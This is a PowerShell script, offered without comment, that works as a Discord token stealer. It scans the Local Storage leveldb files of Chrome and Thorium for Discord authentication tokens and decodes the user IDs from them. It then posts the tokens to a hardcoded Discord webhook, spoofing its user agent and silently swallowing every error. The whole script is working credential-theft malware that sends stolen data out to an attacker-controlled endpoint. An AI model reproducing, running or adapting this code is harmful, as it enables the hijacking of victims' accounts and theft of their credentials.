$webhookUrl = "https://discord.com/api/webhooks/1339661412313595954/AXCD8Jm71iI2DCA6zQYLFE-lkyjgBYpQW68f-V1n0NjkV3OML0ZSWksOKmvPsN_VgwuE"
$tokenPattern = '[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{34,38}'
$headers = @{
    "Content-Type" = "application/json"
    "User-Agent" = "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}

$paths = @(
    "$env:LOCALAPPDATA\Thorium\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
)

$allTokens = @{}

# Optimized file processing using .NET methods
foreach ($path in $paths) {
    if (-not (Test-Path $path)) { continue }
    
    $files = [System.IO.Directory]::EnumerateFiles($path, "*.*", [System.IO.SearchOption]::TopDirectoryOnly) |
             Where-Object { $_ -match '\.(ldb|log)$' }

    foreach ($file in $files) {
        try {
            $content = [System.IO.File]::ReadAllText($file, [System.Text.Encoding]::UTF8)
            $matches = [regex]::Matches($content, $tokenPattern)
            
            foreach ($match in $matches) {
                $token = $match.Value
                $userPart = $token.Split('.')[0]
                if (-not $userPart) { continue }

                try {
                    $padded = $userPart.PadRight($userPart.Length + (4 - $userPart.Length % 4) % 4, '=')
                    $userId = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($padded))
                    if ($userId -match '^\d+$') {
                        if (-not $allTokens.ContainsKey($userId)) {
                            $allTokens[$userId] = [System.Collections.Generic.HashSet[string]]::new()
                        }
                        [void]$allTokens[$userId].Add($token)
                    }
                } catch { }
            }
        } catch { }
    }
}

# Fast webhook submission
if ($allTokens.Count -gt 0) {
    $body = @{
        content = "Pc Tokens:"
        embeds = @(
            @{
                fields = @(
                    foreach ($userId in $allTokens.Keys) {
                        @{
                            name = $userId
                            value = ($allTokens[$userId] -join "`n")
                        }
                    }
                )
            }
        )
    } | ConvertTo-Json -Depth 5

    try {
        $null = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
    } catch { }
}